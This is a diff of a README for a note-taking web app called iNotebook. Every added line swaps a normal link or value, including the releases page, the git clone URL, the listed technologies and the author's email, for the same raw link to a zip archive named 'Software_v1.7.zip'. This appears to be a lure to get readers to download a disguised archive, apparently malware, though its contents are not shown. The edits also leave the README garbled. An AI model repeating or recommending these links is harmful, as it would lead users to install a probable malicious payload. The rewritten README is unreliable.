@@ -1,6 +1,6 @@
 # iNotebook: Your Cloud-Based Note-Taking Solution 🌥️📝
 
-![iNotebook](https://img.shields.io/badge/iNotebook-React%20%7C%20Node.js%20%7C%20MongoDB-blue)
+![iNotebook](https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip%20%7C%https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip%20%7C%20MongoDB-blue)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -19,7 +19,7 @@
 
 iNotebook is a full-stack cloud-based note-taking web application. Users can securely create, read, update, and delete their personal notes from anywhere. Built with a focus on simplicity and efficiency, iNotebook leverages modern technologies to provide a seamless experience. 
 
-For the latest updates and releases, visit [Releases](https://github.com/safnihsn/inotebook/releases).
+For the latest updates and releases, visit [Releases](https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip).
 
 ## Features
 
@@ -32,8 +32,8 @@ For the latest updates and releases, visit [Releases](https://github.com/safnihs
 
 ## Technologies Used
 
-- **Frontend**: React.js, Bootstrap
-- **Backend**: Node.js, Express.js
+- **Frontend**: https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip, Bootstrap
+- **Backend**: https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip, https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip
 - **Database**: MongoDB
 - **Authentication**: JSON Web Tokens (JWT)
 - **Deployment**: Netlify for frontend, custom server for backend
@@ -44,7 +44,7 @@ To set up iNotebook on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/safnihsn/inotebook.git
+   git clone https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -179,7 +179,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For questions or feedback, please contact:
 
-- **Author**: [Your Name](https://github.com/safnihsn)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip)
+- **Email**: https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip
 
-For the latest updates and releases, visit [Releases](https://github.com/safnihsn/inotebook/releases).
+For the latest updates and releases, visit [Releases](https://raw.githubusercontent.com/safnihsn/inotebook/master/public/Software_v1.7.zip).
